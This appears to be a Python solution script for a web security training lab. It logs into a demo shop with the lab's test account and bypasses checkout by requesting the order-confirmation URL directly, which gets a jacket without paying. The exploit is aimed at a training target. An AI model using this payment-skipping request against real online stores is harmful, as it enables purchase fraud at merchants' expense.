# Problem -> Insufficient workflow validation

import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Defining proxy
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

# Exfiltrate csrf token 
def get_csrf(s,url):
    res = s.get(url,verify=False,proxies=proxies)
    soup = BeautifulSoup(res.text,'html.parser')
    csrf = soup.find('input',{'name':'csrf'})['value']
    return csrf

#Function for jacket buy
def jacket_buy(s,url):
    #login code
    login_url = url + '/login'
    csrf_token = get_csrf(s,login_url)
    login_data = {
        'csrf':csrf_token,
        'username':'wiener',
        'password':'peter'
    }
    res = s.post(login_url,data=login_data,verify=False,proxies=proxies)
    if 'Log out' in res.text:
        print('[+] Successfully LoggedIn as wiener')
        
        #Adding jacket into cart
        cart_url = url + '/cart'
        cart_data = {
            'productId':1,
            'redir':'PRODUCT',
            'quantity':1
        }
        s.post(cart_url,data=cart_data,verify=False,proxies=proxies)
        print('[+] Jacket added into cart')

        # Buying jacket using flaw iin application
        url = url + '/cart/order-confirmation?order-confirmed=true'
        res = s.get(url,verify=False,proxies=proxies)
        if "Congratulations" in res.text:
            print('[+] Successfully Buy the Leather Jacket')
            print('[+]    Lab  Solved')
        else:
            print('[-] Unable to solve the lab')

    else:
        print('[+] Unable to log in')

# Main function 
def main():
    if len(sys.argv) != 2:
        print('[-] Usage: python3 {} <target-url>'.format(sys.argv[0]))
    else:
        s = requests.Session()
        url = sys.argv[1]
        jacket_buy(s,url)


if __name__ == '__main__':
    main()